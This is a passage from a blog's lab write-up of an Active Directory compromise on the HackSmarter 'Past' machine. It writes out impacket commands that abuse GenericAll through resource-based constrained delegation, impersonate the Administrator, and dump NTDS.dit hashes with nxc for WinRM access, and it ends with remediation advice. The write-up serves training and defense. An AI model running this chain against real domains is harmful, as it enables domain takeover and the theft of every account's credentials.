+<h2 id="step-5-privilege-escalation-via-resource-based-constrained-delegation" class="relative group">Step 5: Privilege Escalation via Resource-Based Constrained Delegation <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-5-privilege-escalation-via-resource-based-constrained-delegation" aria-label="Anchor">#</a></span></h2><p>I went back to BloodHound to exploit the <strong>GenericAll</strong> permission held by <code>tyler</code>.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="https://k40tik.github.io/posts/past-hacksmarter/bloodhound-genericall-1_hu_7acd9103b5c54e77.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="439"
+        height="605"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/past-hacksmarter/bloodhound-genericall-1.png"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/past-hacksmarter/bloodhound-genericall-2_hu_a6d4ee0c378b4ca1.webp 330w,https://k40tik.github.io/posts/past-hacksmarter/bloodhound-genericall-2_hu_e40f051d22d244ad.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/past-hacksmarter/bloodhound-genericall-2_hu_c2d14b5a6f2c9c70.webp 976w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/past-hacksmarter/bloodhound-genericall-2_hu_c2d14b5a6f2c9c70.webp 976w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="976"
+        height="280"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/past-hacksmarter/bloodhound-genericall-2_hu_83b37ac734a30ff4.png" srcset="https://k40tik.github.io/posts/past-hacksmarter/bloodhound-genericall-2_hu_6b95a80d15793877.png 330w,https://k40tik.github.io/posts/past-hacksmarter/bloodhound-genericall-2_hu_83b37ac734a30ff4.png 660w
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/bloodhound-genericall-2.png 976w
+          
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/bloodhound-genericall-2.png 976w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>I guided the attack chain using the HackTricks documentation on Resource-Based Constrained Delegation.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/past-hacksmarter/hacktricks-rbcd-guide_hu_30ed544a298009df.webp 330w,https://k40tik.github.io/posts/past-hacksmarter/hacktricks-rbcd-guide_hu_fcfda1a9dc071126.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/past-hacksmarter/hacktricks-rbcd-guide_hu_df94e7a66008e792.webp 944w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/past-hacksmarter/hacktricks-rbcd-guide_hu_df94e7a66008e792.webp 944w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="944"
+        height="538"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/past-hacksmarter/hacktricks-rbcd-guide_hu_28e00c8e4ea4a4ce.png" srcset="https://k40tik.github.io/posts/past-hacksmarter/hacktricks-rbcd-guide_hu_e4f2303ede47f805.png 330w,https://k40tik.github.io/posts/past-hacksmarter/hacktricks-rbcd-guide_hu_28e00c8e4ea4a4ce.png 660w
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/hacktricks-rbcd-guide.png 944w
+          
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/hacktricks-rbcd-guide.png 944w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h3 id="step-1-create-a-controlled-machine-account" class="relative group">Step 1: Create a Controlled Machine Account <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-1-create-a-controlled-machine-account" aria-label="Anchor">#</a></span></h3><p>I added a new machine account to the domain that I fully control.</p>
+<pre tabindex="0"><code>impacket-addcomputer -computer-name &#39;KAOS$&#39; -computer-pass &#39;&lt;REDACTED&gt;&#39; \
+  -dc-host EC2AMAZ-A5O4OL8.past.local -k -no-pass &#39;past.local/tyler&#39;
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/past-hacksmarter/addcomputer-kaos_hu_52a017de0243d770.webp 330w,https://k40tik.github.io/posts/past-hacksmarter/addcomputer-kaos_hu_229cf52ec89bed99.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/past-hacksmarter/addcomputer-kaos_hu_c127cd23260720bd.webp 770w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/past-hacksmarter/addcomputer-kaos_hu_c127cd23260720bd.webp 770w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="770"
+        height="102"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/past-hacksmarter/addcomputer-kaos_hu_722eea466b99120b.png" srcset="https://k40tik.github.io/posts/past-hacksmarter/addcomputer-kaos_hu_1ec44e6c498b22c2.png 330w,https://k40tik.github.io/posts/past-hacksmarter/addcomputer-kaos_hu_722eea466b99120b.png 660w
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/addcomputer-kaos.png 770w
+          
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/addcomputer-kaos.png 770w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h3 id="step-2-grant-rbcd-on-the-target-to-the-controlled-machine" class="relative group">Step 2: Grant RBCD on the Target to the Controlled Machine <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-2-grant-rbcd-on-the-target-to-the-controlled-machine" aria-label="Anchor">#</a></span></h3><p>Using <code>tyler</code>&rsquo;s GenericAll permission, I granted the controlled machine account the ability to delegate to the target computer.</p>
+<pre tabindex="0"><code>impacket-rbcd past.local/tyler -k -no-pass \
+  -delegate-to &#39;EC2AMAZ-A5O4OL8$&#39; -delegate-from &#39;KAOS$&#39; -action write
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/past-hacksmarter/rbcd-write_hu_75fa9a15a11f18ef.webp 330w,https://k40tik.github.io/posts/past-hacksmarter/rbcd-write_hu_31a6f1a41c358b37.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/past-hacksmarter/rbcd-write_hu_e8836195963730c0.webp 832w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/past-hacksmarter/rbcd-write_hu_e8836195963730c0.webp 832w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="832"
+        height="255"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/past-hacksmarter/rbcd-write_hu_af28be51d362a291.png" srcset="https://k40tik.github.io/posts/past-hacksmarter/rbcd-write_hu_6f757add0e8adbd9.png 330w,https://k40tik.github.io/posts/past-hacksmarter/rbcd-write_hu_af28be51d362a291.png 660w
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/rbcd-write.png 832w
+          
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/rbcd-write.png 832w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h3 id="step-3-get-a-tgt-for-the-new-controlled-computer" class="relative group">Step 3: Get a TGT for the New Controlled Computer <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-3-get-a-tgt-for-the-new-controlled-computer" aria-label="Anchor">#</a></span></h3><p>I requested a Ticket Granting Ticket for the new machine account.</p>
+<pre tabindex="0"><code>impacket-getTGT past.local/&#39;KAOS$&#39;:&#39;&lt;REDACTED&gt;&#39; -dc-ip 10.1.162.214
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/past-hacksmarter/gettgt-kaos_hu_2f6bf53f6d806ee0.webp 330w,https://k40tik.github.io/posts/past-hacksmarter/gettgt-kaos_hu_ee788d54b05b82de.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/past-hacksmarter/gettgt-kaos_hu_66ed4b1af94c71ff.webp 715w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/past-hacksmarter/gettgt-kaos_hu_66ed4b1af94c71ff.webp 715w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="715"
+        height="79"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/past-hacksmarter/gettgt-kaos_hu_9665577d9679eed7.png" srcset="https://k40tik.github.io/posts/past-hacksmarter/gettgt-kaos_hu_798a9a8bf79c99f8.png 330w,https://k40tik.github.io/posts/past-hacksmarter/gettgt-kaos_hu_9665577d9679eed7.png 660w
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/gettgt-kaos.png 715w
+          
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/gettgt-kaos.png 715w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h3 id="step-4-impersonate-the-administrator" class="relative group">Step 4: Impersonate the Administrator <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-4-impersonate-the-administrator" aria-label="Anchor">#</a></span></h3><p>Using the RBCD configuration, I requested a service ticket for the CIFS service while impersonating the <code>Administrator</code>.</p>
+<pre tabindex="0"><code>impacket-getST -spn cifs/EC2AMAZ-A5O4OL8.past.local -impersonate administrator \
+  -k -no-pass -dc-ip 10.1.162.214 past.local/&#39;KAOS$&#39;
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/past-hacksmarter/getst-admin_hu_e711476c27c33e79.webp 330w,https://k40tik.github.io/posts/past-hacksmarter/getst-admin_hu_dc540e05a6efb535.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/past-hacksmarter/getst-admin_hu_336e9cd44738691e.webp 786w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/past-hacksmarter/getst-admin_hu_336e9cd44738691e.webp 786w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="786"
+        height="144"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/past-hacksmarter/getst-admin_hu_f972be3245dc2439.png" srcset="https://k40tik.github.io/posts/past-hacksmarter/getst-admin_hu_e39da38505f1eafa.png 330w,https://k40tik.github.io/posts/past-hacksmarter/getst-admin_hu_f972be3245dc2439.png 660w
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/getst-admin.png 786w
+          
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/getst-admin.png 786w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h2 id="step-6-domain-compromise" class="relative group">Step 6: Domain Compromise <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-6-domain-compromise" aria-label="Anchor">#</a></span></h2><p>With the Administrator service ticket, I dumped the NTDS.dit secrets using the Kerberos ticket.</p>
+<pre tabindex="0"><code>nxc smb 10.1.162.214 -u administrator -k --use-kcache --ntds
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/past-hacksmarter/ntds-dump_hu_99af18f4982cf043.webp 330w,https://k40tik.github.io/posts/past-hacksmarter/ntds-dump_hu_6d507dbdff5cfc68.webp 660w
+            
+              ,https://k40tik.github.io/posts/past-hacksmarter/ntds-dump_hu_f009dc1b30c66fef.webp 1024w
+            
+            
+              
+                ,https://k40tik.github.io/posts/past-hacksmarter/ntds-dump_hu_9018d19e24fccc35.webp 1073w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1073"
+        height="424"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/past-hacksmarter/ntds-dump_hu_d8e20ae32fc83bf4.png" srcset="https://k40tik.github.io/posts/past-hacksmarter/ntds-dump_hu_2ce861704eab0376.png 330w,https://k40tik.github.io/posts/past-hacksmarter/ntds-dump_hu_d8e20ae32fc83bf4.png 660w
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/ntds-dump_hu_cd7e55fd57414911.png 1024w
+          
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/ntds-dump.png 1073w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Using the obtained Administrator NTLM hash, I authenticated over WinRM, achieving full remote access to the domain controller.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/past-hacksmarter/winrm-admin_hu_a6988af88f2e1c4e.webp 330w,https://k40tik.github.io/posts/past-hacksmarter/winrm-admin_hu_9b1ef69061527f3f.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/past-hacksmarter/winrm-admin_hu_6075ef18c3b4d5df.webp 830w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/past-hacksmarter/winrm-admin_hu_6075ef18c3b4d5df.webp 830w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="830"
+        height="219"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/past-hacksmarter/winrm-admin_hu_30b57fb9973a5fb9.png" srcset="https://k40tik.github.io/posts/past-hacksmarter/winrm-admin_hu_e4701eb09cf67d54.png 330w,https://k40tik.github.io/posts/past-hacksmarter/winrm-admin_hu_30b57fb9973a5fb9.png 660w
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/winrm-admin.png 830w
+          
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/winrm-admin.png 830w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h2 id="step-7-finding-ryans-password" class="relative group">Step 7: Finding Ryan&rsquo;s Password <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-7-finding-ryans-password" aria-label="Anchor">#</a></span></h2><p>The final objective was to locate the password for Ryan&rsquo;s account. I checked the PowerShell history location on the domain controller.</p>
+<pre tabindex="0"><code>(Get-PSReadlineOption).HistorySavePath
+</code></pre><h2 id="resources" class="relative group">Resources <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#resources" aria-label="Anchor">#</a></span></h2><ul>
+<li><a href="https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/resource-based-constrained-delegation.html" target="_blank" rel="noreferrer">HackTricks — Resource-Based Constrained Delegation</a></li>
+</ul>
+<h2 id="conclusion" class="relative group">Conclusion <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#conclusion" aria-label="Anchor">#</a></span></h2><p>This engagement demonstrated a full Active Directory domain compromise starting from nothing but VPN access:</p>
+<ol>
+<li><strong>SMB guest enumeration</strong> revealed a non-standard share and enabled user enumeration via RID brute-force.</li>
+<li><strong>TimeRoasting</strong> harvested computer account hashes, and one was cracked with <strong>Hashcat</strong>.</li>
+<li><strong>Password spraying</strong> with the cracked machine account password granted access to SMB shares.</li>
+<li><strong>SYSVOL scripts folder</strong> leaked plaintext credentials for <code>tyler</code>.</li>
+<li><strong>Kerberos ticket authentication</strong> bypassed <code>tyler</code>&rsquo;s logon-hour restrictions.</li>
+<li><strong>GenericAll abuse</strong> enabled a Resource-Based Constrained Delegation attack.</li>
+<li>A <strong>machine account I controlled</strong> (<code>KAOS$</code>) was used to impersonate <code>Administrator</code> and dump <strong>NTDS.dit</strong>.</li>
+<li>The Administrator <strong>NTLM hash</strong> provided full WinRM access to the domain controller.</li>
+</ol>
+<p>To secure the environment, the following remediations are recommended:</p>
+<ul>
+<li><strong>Harden SMB guest access:</strong> Disable the guest account and the null-session fallback to prevent unauthenticated share and user enumeration.</li>
+<li><strong>Enable TimeRoasting mitigations:</strong> Harden <code>lastLogonTimestamp</code> replication access and monitor for unexpected TimeRoast queries.</li>
+<li><strong>Audit the SYSVOL scripts folder:</strong> Remove plaintext credentials and secrets from Group Policy scripts, and restrict read access to SYSVOL.</li>
+<li><strong>Enforce strong machine account passwords:</strong> Machine account passwords should be random and crack-resistant.</li>
+<li><strong>Remove excessive object control:</strong> Audit and revoke <code>GenericAll</code> ACLs, especially on computer accounts in the environment.</li>
+<li><strong>Monitor for RBCD abuse:</strong> Alert on modifications to the <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute and on new machine accounts created with <code>addcomputer</code>.</li>
+<li><strong>Enforce tiered administration:</strong> Separate administrative accounts from standard user accounts and apply strict logon restrictions consistently.</li>
+</ul>
+
+      </div>
+    </section>
+    <footer class="max-w-prose pt-8 print:hidden">
+      
+  <div class="flex">
+    
+    
+    
+      
+      
+        
+        
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="!mb-0 !mt-0 me-4 w-24 h-auto rounded-full"
+      
+    >
+      
+      
+      
+      
+      <img
+        width="960"
+        height="1280"
+        class="!mb-0 !mt-0 me-4 w-24 h-auto rounded-full"
+        alt="k40t1k"
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/img/k40t1k_hu_ebd2a57fb32cf973.jpeg" srcset="https://k40tik.github.io/img/k40t1k_hu_210ca2abc75c60a7.jpeg 330w,https://k40tik.github.io/img/k40t1k_hu_ebd2a57fb32cf973.jpeg 660w
+          
+            ,https://k40tik.github.io/img/k40t1k.jpeg 960w
+          
+          
+            ,https://k40tik.github.io/img/k40t1k.jpeg 960w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+      
+    
+    <div class="place-self-center">
+      
+        <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
+          Author
+        </div>
+        <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
+          k40t1k
+        </div>
+      
+      
+      <div class="text-2xl sm:text-lg">
+  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
+    
+      
+        <a
+          class="px-1 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400"
+          style="will-change:transform;"
+          href="https://github.com/jkilonzi"
+          target="_blank"
+          aria-label="Github"
+          rel="me noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400"
+          style="will-change:transform;"
+          href="https://linkedin.com/in/john-maluki"
+          target="_blank"
+          aria-label="Linkedin"
+          rel="me noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400"
+          style="will-change:transform;"
+          href="https://medium.com/@jkilonzi301"
+          target="_blank"
+          aria-label="Medium"
+          rel="me noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path fill="currentColor" d="M180.5,74.262C80.813,74.262,0,155.633,0,256S80.819,437.738,180.5,437.738,361,356.373,361,256,280.191,74.262,180.5,74.262Zm288.25,10.646c-49.845,0-90.245,76.619-90.245,171.095s40.406,171.1,90.251,171.1,90.251-76.619,90.251-171.1H559C559,161.5,518.6,84.908,468.752,84.908Zm139.506,17.821c-17.526,0-31.735,68.628-31.735,153.274s14.2,153.274,31.735,153.274S640,340.631,640,256C640,171.351,625.785,102.729,608.258,102.729Z"/></svg>
+</span></a
+        >
+      
+    
+  </div>
+
+</div>
+    </div>
+  </div>
+
+
+      
+
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="group flex" href="https://k40tik.github.io/posts/shadowgate-hacksmarter/">
+              <span
+                class="me-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&larr;</span
+                ><span class="ltr:hidden rtl:inline">&rarr;</span></span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >ShadowGate — HackSmarter</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2026-08-07 17:00:00 &#43;0300 EAT">7 August 2026</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+            <a class="group flex text-right" href="https://k40tik.github.io/posts/flute-hackmyvm/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Flute — HackMyVM</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2026-08-18 14:25:00 &#43;0300 EAT">18 August 2026</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ms-2 text-neutral-700 transition-transform group-hover:-translate-x-[-2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&rarr;</span
+                ><span class="ltr:hidden rtl:inline">&larr;</span></span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+      </main>
+      
+        <div
+          class="pointer-events-none absolute bottom-0 end-0 top-[100vh] w-12"
+          id="to-top"
+          hidden="true"
+        >
+          <a
+            href="#the-top"
+            class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+            aria-label="Scroll to top"
+            title="Scroll to top"
+          >
+            &uarr;
+          </a>
+        </div>
+      <footer class="py-10 print:hidden">
+  
+  
+  <div class="flex items-center justify-between">
+    <div>
+      
+      
+        <p class="text-sm text-neutral-500 dark:text-neutral-400">
+            &copy;
+            2026
+            k40t1k
+        </p>
+      
+      
+      
+        <p class="text-xs text-neutral-500 dark:text-neutral-400">
+          
+          
+          Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+            href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://github.com/jpanther/congo" target="_blank" rel="noopener noreferrer">Congo</a>
+        </p>
+      
+    </div>
+    <div class="flex flex-row items-center">
+      
+      
+      
+      
+    </div>
+  </div>
+  
+  
+</footer>
+
+    </div>
+  </body>
+</html>
